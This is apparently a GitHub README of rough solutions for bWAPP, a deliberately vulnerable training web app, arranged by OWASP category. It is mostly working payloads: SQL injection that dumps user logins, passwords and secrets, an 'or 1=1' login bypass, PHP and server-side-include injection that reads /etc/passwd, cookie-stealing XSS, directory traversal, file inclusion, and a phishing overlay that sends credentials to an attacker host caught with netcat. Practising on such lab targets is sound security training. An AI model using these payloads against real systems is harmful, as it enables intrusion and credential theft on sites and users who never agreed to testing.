# solutions-bwapp
Rough solutions

Ref sheet
http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
http://www.sqlinjectionwiki.com/Categories/2/mysql-sql-injection-cheat-sheet/

# A1 - Injection

### HTML Injection - Reflected (GET)
htmli_get.php

```
/bWAPP/htmli_get.php?firstname=%3Ch1%3EHello%3C%2Fh1%3E&lastname=%3Ch2%3EWorld%3C%2Fh2%3E&form=submit
```
 
### HTML Injection - Reflected (POST)

```
<h1>Hello</h1>
<h2>World</h2>
```

### HTML Injection - Reflected (URL)

XXX:  Todo, IE only?
```
/bWAPP/htmli_current_url.php
```

### HTML Injection - Stored (Blog)

Following solution taken from:
```
http://penthusiasts.blogspot.com/2013/12/bwapp-html-injection-all.html
```
```
<div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: 1em;">Please login with valid credentials:<br><form name="login" action="http://AttackerIP/login.htm"><table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr><tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr></table></form></div>
```

Attacker's machine:
```
nc -l 80
```

### PHP Code Injection

```
/bWAPP/phpi.php?message=a;echo "what"; $fp = fopen("/etc/passwd","r");$result = fread($fp,8192); echo $result
```
### Server-Side Includes:

```
<!--#echo var="DATE_LOCAL" -->
<!--#exec cmd="cat /etc/passwd" -->
```

### SQL Injection (GET/SEARCH)

```
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;--
```

### SQL Injection (GET/SELECT)

```
movie=1 UNION ALL SELECT table_schema, table_name, null, null, null, null, null FROM information_schema.tables LIMIT 1 OFFSET 1;--
```
![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_2_1.png)
![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_2_2.png)

### SQL Injection (POST/Search)
/bWAPP/sqli_6.php

```
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;-- 
```

### SQL Injection (POST/Select)

Use Burp
```
movie=1 UNION ALL SELECT table_schema, table_name, null, null, null, null, null FROM information_schema.tables LIMIT 1 OFFSET 1;--
```

### SQL Injection (AJAX/JSON/jQuery)
Use Burp 
```
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;--
```
![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_10_1.png)

a%' UNION ALL SELECT 1, column_name, null, null, null, null, null from information_schema.columns where table_name="users";-- 

blah%' union all select 1,login,password,email,secret,1, 1 from users --

### SQL Injection (Login Form/Hero)
```
ok' or 1=1-- 
```
### SQL Injection(SQLite)

```
a%' UNION ALL SELECT 1,sqlite_version(),1,1,1,1; --
```

# A2 - Broken Authentication

### Broken Auth. - CAPTCHA Bypassing

Using Burp, do not allow the webpage to load captcha_box.php, this page loads the server's session variable $_SESSION["captcha"] which will then require a check on ba_captcha_bypass.php
The second requirement is to prevent captcha_user from being submitted by the client.  Eliminate this using Burp:


```
POST /bWAPP/ba_captcha_bypass.php HTTP/1.1
Host: bepp:8088
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://bepp:8088/bWAPP/ba_captcha_bypass.php
Cookie: PHPSESSID=67a6abb1d7ff40c55ad50d3aa43fc7c4; security_level=0
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

login=bee&password=bug&form=submit

# A3 - Cross-Site Scripting (XSS) 

### XSS - Reflected (GET)
xss_get.php

```
<script>alert(document.cookie)</script>
```

### XSS - Reflected (POST)

xss_post.php
```
<script>alert(document.cookie)</script>
```

# A4 - Insecure Direct Object References

### Insecure DOR (Change Secret)
Use Burp to unhide hidden fields or intercept POST param.  

### Insecure DOR (Reset Secret)
Change 'login' and 'secret' field to arbitrary values.
```
POST /bWAPP/xxe-2.php HTTP/1.1
Host: bepp:8088
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=UTF-8
Referer: http://bepp:8088/bWAPP/insecure_direct_object_ref_3.php
Content-Length: 59
Cookie: PHPSESSID=77aa634b546d1c78d5afc16aae328172; security_level=0
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

<reset><login>bee</login><secret>Any bugs?</secret></reset>
```

### Insecure DOR (Order Tickets)
bWAPP/insecure_direct_object_ref_2.php

Use Burp to unhide hidden ticket price field, or use proxy to modify the POST param while in transit.


# A6 - Sensitive Data Exposure 

### Base64 Encoding (Secret)

Use Burp to get cookie

![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/insecure_crypt_storage_3.png)

# A7 - Missing Functional Level Access Control

### Directory Traversal - Directories
directory_traversal_2.php
```
/bWAPP/directory_traversal_2.php?directory=../../../../home/
```

### Directory Traversal - Files
directory_traversal_1.php
```
/bWAPP/directory_traversal_1.php?page=../../../../../etc/passwd
```

### Host Header Attack (Cache Poisoning)
hostheader_1.php

![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/hostheader_1_1.png)

### Host Header Attack (Reset Poisoning)
hostheader_2.php

![]()

### Remote & Local File Inclusion (RFI/LFI)

Copy rfi.txt to rfi.php, it appears PHP automatically adds the suffix .php. 
```
bWAPP/rlfi.php?language=../evil/rfi
```

